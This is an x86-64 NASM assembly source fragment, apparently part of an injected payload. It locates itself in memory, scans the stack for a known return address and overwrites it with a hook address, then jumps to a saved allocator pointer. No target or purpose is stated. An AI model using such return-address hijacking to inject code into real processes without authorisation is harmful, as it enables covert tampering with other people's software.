%include 'defines.asm'

; config
%define config_scan_size 0x80

; args
%define arg_str rcx
%define arg_file rdx
%define arg_line r8

; prologue
enter 0, 0
push rbx
push rsi
call back
back:   pop rbx
        and rbx, 0xFFFFFFFFFFFFF000

; scanning the stack
mov rsi, QWORD payload_find_ret_addr[rbx]
mov rax, rbp
add rax, config_scan_size
scan:   sub rax, 8
        cmp rax, rbp
        je done
        cmp rsi, QWORD [rax]
        jne scan
        mov rsi, QWORD payload_hook_ret_addr[rbx]
        mov QWORD [rax], rsi

; fetch resume address
done:   mov rax, QWORD payload_org_alloc_ptr[rbx]

; epilogue
pop rsi
pop rbx
leave
jmp rax
